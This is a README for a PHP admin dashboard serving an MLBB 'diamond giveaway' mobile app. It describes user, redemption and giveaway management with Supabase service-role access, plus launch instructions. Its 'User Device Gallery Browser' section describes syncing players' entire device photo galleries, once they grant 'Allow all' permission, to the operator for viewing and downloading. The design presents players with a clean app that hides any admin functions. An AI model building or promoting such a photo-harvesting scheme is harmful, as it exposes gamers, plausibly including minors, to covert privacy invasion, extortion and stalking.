# Ketupat MLBB - Supreme PHP Admin Console & Management System

Highest Access Cloud Administration Dashboard for Mobile Legends: Bang Bang Tools & Diamond Giveaway.

---

## 🌟 Key Features

1. **Highest Access Privilege Mode (RLS Bypassed)**
   - Communicates with Supabase REST API via backend PHP cURL requests using the **Secret Key** (`sb_secret_...` / Service Role Key).
   - Allows full administrative **CRUD** (Create, Read, Update, Delete) permissions on all tables without being restricted by Row Level Security (RLS) policies.
   - Falls back gracefully to public Anon Key if Secret Key is not yet entered, with an immediate dashboard alert prompting you to input the secret key.

2. **Full CRUD Operations**
   - **Users & Players**: Add new users, edit points balance, diamonds claimed, ticket allocations, streaks, and delete accounts permanently.
   - **Diamond Redemptions**: Real-time queue, inline status quick switcher (`Processing`, `Completed`, `Rejected`), create manual orders, edit fulfillment data, and delete records.
   - **Giveaway Arena**: Add entries across Daily, Mega, and Special pools, remove entries, and roll weighted random winners directly from the active ticket pool.
   - **1-Click CSV Export**: Download user directories, redemption logs, and giveaway records in CSV format.

3. **Database & API Configuration (Admin Website Only)**
   - Manage Supabase Project REST URL, Secret Key, and Publishable Key.
   - Manage DlyyZ API Key for MLBB nickname verification and account binding lookups (`cekbind`).
   - Integrated "Test Connection" diagnostic tool to verify Supabase REST API connectivity and access level in real-time.
   - Admin Security PIN protection for critical operations.

4. **User Device Gallery Browser (Full Media Access)**
   - When a player grants gallery permission in the mobile app ("Allow all"), their device photos are synchronized and become accessible in the admin console.
   - **"Browse Gallery" Button**: Available in the Users table for each player, or through the dedicated **"Gallery Browser"** navigation tab.
   - **Interactive Lightbox & Downloader**: View photos in high resolution with file size, capture date, zoom, and 1-click download.
   - **Photo Management**: View avatars, uploaded device images, delete individual photos, or manually upload additional images for a user.

5. **100% Clean Mobile App (Zero Admin Clutter)**
   - All admin options, developer quick-fills, and API keys are completely stripped from the APK.
   - The mobile application presents a smooth, player-only onboarding:
     `Splash Screen` &rarr; `MLBB ID & Server Validation` &rarr; `Account Bind Status Cards` &rarr; `Ketupat Main App`.

---

## 🚀 How to Run the PHP Admin Website

### Option 1: One-Click Launcher (Easiest)
Simply double-click the **`launch-php-admin.bat`** file located in the root project folder:
```
C:\Users\dhzzy\Desktop\tools\launch-php-admin.bat
```
This automatically utilizes the bundled portable PHP runtime (`php-runtime/`), starts a local web server at `http://localhost:8080`, and opens your default browser.

### Option 2: Command Line (CLI)
Using the portable PHP engine:
```powershell
& "C:\Users\dhzzy\Desktop\tools\php-runtime\php.exe" -S localhost:8080 -t "C:\Users\dhzzy\Desktop\tools\admin-php"
```
Then visit `http://localhost:8080` in any browser.

### Option 3: Standard Web Servers (XAMPP / Laragon / Apache / Nginx / cPanel)
Copy the contents of the `admin-php/` folder directly to your web root (e.g. `C:/xampp/htdocs/ketupat-admin` or your hosting directory). Ensure PHP 8.0+ is active with `curl` and `openssl` extensions enabled.

---

## 🔑 Activating Highest Access (Secret Key)
1. Open the Admin Console at `http://localhost:8080`.
2. Go to the **Cloud & API Settings** tab.
3. Paste your Supabase Secret Key (`sb_secret_...`) into the **Supabase Secret Key** input field.
4. Click **Save Cloud Settings**.
5. Click **Test Connection** — the status badge in the header will immediately turn green: **Highest Access (Service Role)**.
